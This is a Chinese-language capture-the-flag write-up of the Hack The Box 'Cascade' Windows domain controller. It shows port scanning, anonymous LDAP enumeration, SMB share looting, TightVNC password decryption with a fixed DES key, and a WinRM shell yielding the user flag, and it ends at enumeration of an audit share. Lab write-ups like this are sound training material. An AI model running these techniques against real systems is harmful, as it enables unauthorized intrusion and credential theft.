---
title: HTB-Cascade Writeup
date: 2026-08-19T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - LDAP
  - SMB
  - 逆向
---
## Nmap 端口扫描

使用 Nmap 扫描开放的 TCP 端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ sudo nmap --min-rate 10000 -p- 10.129.25.165 -oA Nmap/ports
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 22:23 -0400
Nmap scan report for 10.129.25.165
Host is up (0.11s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  **msrpc**
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165

```

## Nmap 详细信息扫描

执行 Nmap 详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165 10.129.25.165 -oA Nmap/detail_scan 
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 22:31 -0400
Nmap scan report for 10.129.25.165
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-17 02:31:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-17T02:31:57
|_  start_date: 2026-08-17T02:02:43
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: -32s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.47 seconds

```

看结果应该是一台 Windows 服务器，解析域名到 hosts 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Casecade]
└─$ sudo bash -c 'echo "10.129.25.165 cascade.local" >> /etc/hosts'                                 
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Casecade]
└─$ tail -n 1 /etc/hosts
10.129.25.165 cascade.local

```

## LDAP 探索

执行 ldap 匿名探测，发现很多用户。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ ldapsearch -x -H ldap://10.129.26.199 -b "dc=cascade,dc=local" "(objectClass=user)" sAMAccountName
# extended LDIF
#
# LDAPv3
# base <dc=cascade,dc=local> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName 
#

# CascGuest, Users, cascade.local
dn: CN=CascGuest,CN=Users,DC=cascade,DC=local
sAMAccountName: CascGuest

# CASC-DC1, Domain Controllers, cascade.local
dn: CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local
sAMAccountName: CASC-DC1$

# ArkSvc, Services, Users, UK, cascade.local
dn: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: arksvc

# Steve Smith, Users, UK, cascade.local
dn: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: s.smith

# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: r.thompson

# Util, Services, Users, UK, cascade.local
dn: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: util

# James Wakefield, Users, UK, cascade.local
dn: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: j.wakefield

# Stephanie Hickson, Users, UK, cascade.local
dn: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: s.hickson

# John Goodhand, Users, UK, cascade.local
dn: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: j.goodhand

# Adrian Turnbull, Users, UK, cascade.local
dn: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: a.turnbull

# Edward Crowe, Users, UK, cascade.local
dn: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: e.crowe

# Ben Hanson, Users, UK, cascade.local
dn: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: b.hanson

# David Burman, Users, UK, cascade.local
dn: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: d.burman

# BackupSvc, Services, Users, UK, cascade.local
dn: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: BackupSvc

# Joseph Allen, Users, UK, cascade.local
dn: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: j.allen

# Ian Croft, Users, UK, cascade.local
dn: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: i.croft

# search reference
ref: ldap://ForestDnsZones.cascade.local/DC=ForestDnsZones,DC=cascade,DC=local

# search reference
ref: ldap://DomainDnsZones.cascade.local/DC=DomainDnsZones,DC=cascade,DC=local

# search reference
ref: ldap://cascade.local/CN=Configuration,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 20
# numEntries: 16
# numReferences: 3

```

将用户名保存为一个字典做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Users]
└─$ cat users        
CascGuest
CASC-DC1$
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

执行更详细的探测。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Users]                                                                                                                                                       
└─$ ldapsearch -x -H ldap://10.129.26.199 -b "dc=cascade,dc=local" "(objectClass=user)" 

# Ryan Thompson, Users, UK, cascade.local                                                                                                                                                         
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local                                                                                                                                           
objectClass: top                                                                                                                                                                                  
objectClass: person                                                                                                                                                                               
objectClass: organizationalPerson                                                                                                                                                                 
objectClass: user                                                                                                                                                                                 
cn: Ryan Thompson                                                                                                                                                                                 
sn: Thompson                                                                                                                                                                                      
givenName: Ryan                                                                                                                                                                                   
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local                                                                                                                            
instanceType: 4                                                                                                                                                                                   
whenCreated: 20200109193126.0Z                                                                                                                                                                    
whenChanged: 20200323112031.0Z                                                                                                                                                                    
displayName: Ryan Thompson                                                                                                                                                                        
uSNCreated: 24610                                                                                                                                                                                 
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local                                                                                                                                               
uSNChanged: 295010                                                                                                                                                                                
name: Ryan Thompson                                                                                                                                                                               
objectGUID:: LfpD6qngUkupEy9bFXBBjA==                                                                                                                                                             
userAccountControl: 66048                                                                                                                                                                         
badPwdCount: 0                                                                                                                                                                                    
codePage: 0                                                                                                                                                                                       
countryCode: 0                                                                                                                                                                                    
badPasswordTime: 132247339091081169                                                                                                                                                               
lastLogoff: 0                                                                                                                                                                                     
lastLogon: 132247339125713230                                                                                                                                                                     
pwdLastSet: 132230718862636251                                                                                                                                                                    
primaryGroupID: 513                                                                                                                                                                               
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==                                                                                                                                              
accountExpires: 9223372036854775807                                                                                                                                                               
logonCount: 2                                                                                                                                                                                     
sAMAccountName: r.thompson                                                                                                                                                                        
sAMAccountType: 805306368                                                                                                                                                                         
userPrincipalName: r.thompson@cascade.local                                                                                                                                                       
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local                                                                                                                          
dSCorePropagationData: 20200126183918.0Z                                                                                                                                                          
dSCorePropagationData: 20200119174753.0Z                                                                                                                                                          
dSCorePropagationData: 20200119174719.0Z                                                                                                                                                          
dSCorePropagationData: 20200119174508.0Z                                                                                                                                                          
dSCorePropagationData: 16010101000000.0Z                                                                                                                                                          
lastLogonTimestamp: 132294360317419816                                                                                                                                                            
msDS-SupportedEncryptionTypes: 0                                                                                                                                                                  
cascadeLegacyPwd: clk0bjVldmE= 
```

可以发现 Ryan Thompson 有个值 cascadeLegacyPwd: clk0bjVldmE= ，像是 base64 加密的字符串，解密看看。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Users]
└─$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

得到一个凭据。

## SMB 探索

执行 SMB 扫描，发现一个自定义目录 Data。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Users]
└─$ smbmap -H 10.129.26.199 -u r.thompson -p 'rY4n5eva'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.26.199:445       Name: cascade.local             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS       
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY       
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections 
```

连接到 Data，将里面的文件下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ smbclient //10.129.26.199/Data -U 'r.thompson%rY4n5eva' -W cascade.local
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (5.2 KiloBytes/sec) (average 5.2 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (2.7 KiloBytes/sec) (average 3.9 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (12.1 KiloBytes/sec) (average 6.7 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (5.1 KiloBytes/sec) (average 6.3 KiloBytes/sec)
smb: \> ^C
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ ls                                                                                 
Contractors  Finance  IT  Production  Temps
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ tree           
.
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps

14 directories, 4 files

```

审计一下。

有一个临时账号 TempAdmin，密码和正常 admin 密码一样，2018 年底会删除。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]                      
└─$ cat IT/Email\ Archives/Meeting_Notes_June_2018.html                                                                       
<html>                                                                                                                        
<body lang=EN-GB link=blue vlink=purple style='tab-interval:36.0pt'>                                                                        
                                                                                                                                            
<div class=WordSection1>                                                                                                                    
                                                                                                                                            
<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span                                                                            
style='mso-bidi-font-family:Calibri;color:black'>From:<span style='mso-tab-count:                                                                             
1'>���������������������������������������� </span></span></b><span                                                                                           
style='mso-bidi-font-family:Calibri;color:black'>Steve Smith                                                                                
<o:p></o:p></span></p>                                                                                                                      
                                                                      
<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
style='mso-bidi-font-family:Calibri;color:black'>To:<span style='mso-tab-count:
1'>���������������������������������������������� </span></span></b><span
style='mso-bidi-font-family:Calibri;color:black'>IT (Internal)<o:p></o:p></span></p>                                                                          
                                                                      
<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span      
style='mso-bidi-font-family:Calibri;color:black'>Sent:<span style='mso-tab-count:                                                                             
1'>������������������������������������������ </span></span></b><span
style='mso-bidi-font-family:Calibri;color:black'>14 June 2018 14:07<o:p></o:p></span></p>                                                                     

                                                                               
<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:  
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span               
style='mso-bidi-font-family:Calibri;color:black'>Subject:<span
style='mso-tab-count:1'>������������������������������������ </span></span></b><span                                                                          
style='mso-bidi-font-family:Calibri;color:black'>Meeting Notes<o:p></o:p></span></p>                                                                          

<p><o:p>&nbsp;</o:p></p>                                                       

<p>For anyone that missed yesterday�s meeting (I�m looking at
you Ben). Main points are below:</p>                                           

<p class=MsoNormal><o:p>&nbsp;</o:p></p>                                       

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to                                  
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>                                       

<p class=MsoNormal>Steve</p>                                                   


</div>                                                                         

</body>                                                                        

</html> 
```

在 8/12/2018 把 TempAdmin 移进了 回收站，但 cascadeLegacyPwd 还在回收站，能被回收站权限账号读取到。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ cat IT/Logs/Ark\ AD\ Recycle\ Bin/ArkAdRecycleBin.log 
1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0       
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
                                                          
```

无有价值信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ cat IT/Logs/DCs/dcdiag.log                           

Directory Server Diagnosis

Performing initial setup:
   Trying to find home server...
   Home Server = CASC-DC1
   * Identified AD Forest. 
   Done gathering initial info.

Doing initial required tests
   
   Testing server: Default-First-Site-Name\CASC-DC1
      Starting test: Connectivity
         ......................... CASC-DC1 passed test Connectivity

Doing primary tests
   
   Testing server: Default-First-Site-Name\CASC-DC1
      Starting test: Advertising
         ......................... CASC-DC1 passed test Advertising
      Starting test: FrsEvent
         ......................... CASC-DC1 passed test FrsEvent
      Starting test: DFSREvent
         ......................... CASC-DC1 passed test DFSREvent
      Starting test: SysVolCheck
         ......................... CASC-DC1 passed test SysVolCheck
      Starting test: KccEvent
         ......................... CASC-DC1 passed test KccEvent
      Starting test: KnowsOfRoleHolders
         ......................... CASC-DC1 passed test KnowsOfRoleHolders
      Starting test: MachineAccount
         ......................... CASC-DC1 passed test MachineAccount
      Starting test: NCSecDesc
         ......................... CASC-DC1 passed test NCSecDesc
      Starting test: NetLogons
         ......................... CASC-DC1 passed test NetLogons
      Starting test: ObjectsReplicated
         ......................... CASC-DC1 passed test ObjectsReplicated
      Starting test: Replications
         ......................... CASC-DC1 passed test Replications
      Starting test: RidManager
         ......................... CASC-DC1 passed test RidManager
      Starting test: Services
         ......................... CASC-DC1 passed test Services
      Starting test: SystemLog
         A warning event occurred.  EventID: 0x8000001D
            Time Generated: 01/10/2020   15:48:14
            Event String:
            The Key Distribution Center (KDC) cannot find a suitable certificate to use for smart card logons, or the KDC certificate could not be verified. Smart card logon may not function correctly if this problem is not resolved. To correct this problem, either verify the existing KDC certificate using certutil.exe or enroll for a new KDC certificate.
         An error event occurred.  EventID: 0xC00038D6
            Time Generated: 01/10/2020   15:48:43
            Event String:
            The DFS Namespace service could not initialize cross forest trust information on this domain controller, but it will periodically retry the operation. The return code is in the record data.
         A warning event occurred.  EventID: 0x000003F6
            Time Generated: 01/10/2020   15:48:43
            Event String:
            Name resolution for the name _ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.cascade.local timed out after none of the configured DNS servers responded.
         A warning event occurred.  EventID: 0x0000000C
            Time Generated: 01/10/2020   15:48:43
            Event String:
            Time Provider NtpClient: This machine is configured to use the domain hierarchy to determine its time source, but it is the AD PDC emulator for the domain at the root of the forest, so there is no machine above it in the domain hierarchy to use as a time source. It is recommended that you either configure a reliable time service in the root domain, or manually configure the AD PDC to synchronize with an external time source. Otherwise, this machine will function as the authoritative time source in the domain hierarchy. If an external time source is not configured or used for this computer, you may choose to disable the NtpClient.
         A warning event occurred.  EventID: 0x000727AA
            Time Generated: 01/10/2020   15:50:52
            Event String:
            The WinRM service failed to create the following SPNs: WSMAN/CASC-DC1.cascade.local; WSMAN/CASC-DC1. 
         ......................... CASC-DC1 failed test SystemLog
      Starting test: VerifyReferences
         ......................... CASC-DC1 passed test VerifyReferences
   
   
   Running partition tests on : ForestDnsZones
      Starting test: CheckSDRefDom
         ......................... ForestDnsZones passed test CheckSDRefDom
      Starting test: CrossRefValidation
         ......................... ForestDnsZones passed test
         CrossRefValidation
   
   Running partition tests on : DomainDnsZones
      Starting test: CheckSDRefDom
         ......................... DomainDnsZones passed test CheckSDRefDom
      Starting test: CrossRefValidation
         ......................... DomainDnsZones passed test
         CrossRefValidation
   
   Running partition tests on : Schema
      Starting test: CheckSDRefDom
         ......................... Schema passed test CheckSDRefDom
      Starting test: CrossRefValidation
         ......................... Schema passed test CrossRefValidation
   
   Running partition tests on : Configuration
      Starting test: CheckSDRefDom
         ......................... Configuration passed test CheckSDRefDom
      Starting test: CrossRefValidation
         ......................... Configuration passed test CrossRefValidation
   
   Running partition tests on : cascade
      Starting test: CheckSDRefDom
         ......................... cascade passed test CheckSDRefDom
      Starting test: CrossRefValidation
         ......................... cascade passed test CrossRefValidation
   
   Running enterprise tests on : cascade.local
      Starting test: LocatorCheck
         ......................... cascade.local passed test LocatorCheck
      Starting test: Intersite
         ......................... cascade.local passed test Intersite

```

有一个有价值的信息 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ cat IT/Temp/s.smith/VNC\ Install.reg 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""

```

解码得到一个凭据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ echo '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -d -des-ecb -K E84AD660C4721AE0 -nopad      
sT333ve2
```

保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Users]
└─$ vim s.smith 
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Users]
└─$ cat s.smith   
s.smith:sT333ve2
```

s.smith 有 winrm 权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ nxc smb 10.129.26.199 -u 's.smith' -p 'sT333ve2'   
SMB         10.129.26.199   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.26.199   445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ nxc winrm 10.129.26.199 -u 's.smith' -p 'sT333ve2'
WINRM       10.129.26.199   5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.26.199   5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)

```

登录拿到 user flag。

## 提权

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/SMB]
└─$ evil-winrm -i cascade.local -u s.smith -p 'sT333ve2'                                    
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
ff05e4a32d956057e15f2574f49757ff
```

枚举得到信息：s.smith 登录时会执行脚本 MapAuditDrive.vbs。

```bash
*Evil-WinRM* PS C:\inetpub> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

看看这个脚本里有什么。

```bash
*Evil-WinRM* PS C:\inetpub> type \\casc-dc1\NETLOGON\MapAuditDrive.vbs
'MapAuditDrive.vbs
Option Explicit
Dim oNetwork, strDriveLetter, strRemotePath
strDriveLetter = "F:"
strRemotePath = "\\CASC-DC1\Audit$"
Set oNetwork = CreateObject("WScript.Network")
oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
WScript.Quit

```

查看这个远程地址得到一个数据库信息。

```bash
*Evil-WinRM* PS C:\inetpub> dir \\CASC-DC1\Audit$


    Directory: \\CASC-DC1\Audit$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/28/2020   9:40 PM                DB
d-----        1/26/2020  10:25 PM                x64
d-----        1/26/2020  10:25 PM                x86
-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
-a----        1/28/2020  11:29 PM             45 RunAudit.bat
-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll
```

查看 RunAudit.bat，里面经常存放敏感信息。

```bash
*Evil-WinRM* PS C:\inetpub> type \\CASC-DC1\Audit$\RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
*Evil-WinRM* PS C:\inetpub> dir \\CASC-DC1\Audit$\DB


    Directory: \\CASC-DC1\Audit$\DB


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/28/2020   9:39 PM          24576 Audit.db

```

将这个文件夹拿到 kali 本地。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ mkdir -p ~/Work/Kali/Cascade/Audit && cd ~/Work/Kali/Cascade/Audit
